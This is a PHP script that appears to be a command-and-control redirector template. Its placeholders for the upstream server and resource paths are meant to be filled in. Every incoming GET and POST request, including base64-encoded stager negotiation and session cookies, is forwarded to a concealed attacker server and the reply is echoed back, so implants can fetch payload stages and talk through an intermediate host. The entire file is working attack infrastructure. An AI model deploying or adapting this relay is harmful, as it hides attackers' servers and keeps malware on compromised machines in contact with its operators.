<?php

// TODO: IP black/whitelisting?

$server = "REPLACE_SERVER";

# get a random resource
# default -> /admin/get.php,/news.asp,/login/process.jsp
$resources = explode("," , "REPLACE_RESOURCES");
$resource = $resources[mt_rand(0, count($resources) - 1)];


function do_get_request($url, $optional_headers = null)
{
  $aContext = array(
    'http' => array(
      'method' => 'GET'
    ),
  );
  if ($optional_headers !== null) {
    $aContext['http']['header'] = $optional_headers;
  }
  $cxContext = stream_context_create($aContext);
  return file_get_contents($url, False, $cxContext);
}

function do_post_request($url, $data, $optional_headers = null)
{
  $params = array('http' => array(
              'method' => 'POST',
              'content' => $data
            ));
  if ($optional_headers !== null) {
    $params['http']['header'] = $optional_headers;
  }
  $ctx = stream_context_create($params);
  $fp = @fopen($url, 'rb', false, $ctx);
  if (!$fp) {
    return '';
  }
  $response = @stream_get_contents($fp);
  if ($response === false) {
    return '';
  }
  return $response;
}

if ($_SERVER['REQUEST_METHOD'] === "GET"){
  $parts = explode("?", $_SERVER['REQUEST_URI']);
  if (count($parts) > 1){

    $parts = explode("&", base64_decode($parts[1]));
    if (count($parts) == 2){
      // in case where're doing stage 0 requests for stager.ps1
      $uri = $server.$parts[1]."?".base64_encode($parts[0]);
      echo do_get_request($uri);
    }
  }
  else {
    if(isset($_COOKIE['SESSIONID'])) {
      echo do_get_request(rtrim($server, "/").$resource, "Cookie: SESSIONID=".$_COOKIE['SESSIONID']);
    }
    else{
      echo do_get_request(rtrim($server, "/").$resource);
    }
  }
}

else{
  $parts = explode("?", $_SERVER['REQUEST_URI']);
  if (count($parts) > 1){

    $parts = explode("&", base64_decode($parts[1]));
    if (count($parts) == 2){
      // in case we're continuing stage negotiation
      $uri = $server.$parts[1]."?".base64_encode($parts[0]);
      $postdata = file_get_contents("php://input");

      if(isset($_COOKIE['SESSIONID'])) {
        echo do_post_request($uri, $postdata, "Cookie: SESSIONID=".$_COOKIE['SESSIONID']);
      }
      else{
        echo do_post_request($uri, $postdata);
      }
    }
  }
  else{
    $postdata = file_get_contents("php://input");
    if(isset($_COOKIE['SESSIONID'])) {
      echo do_post_request(rtrim($server, "/").$resource, $postdata, "Cookie: SESSIONID=".$_COOKIE['SESSIONID']);
    }
    else{
      echo do_post_request(rtrim($server, "/").$resource, $postdata);
    } 
  }
}
?>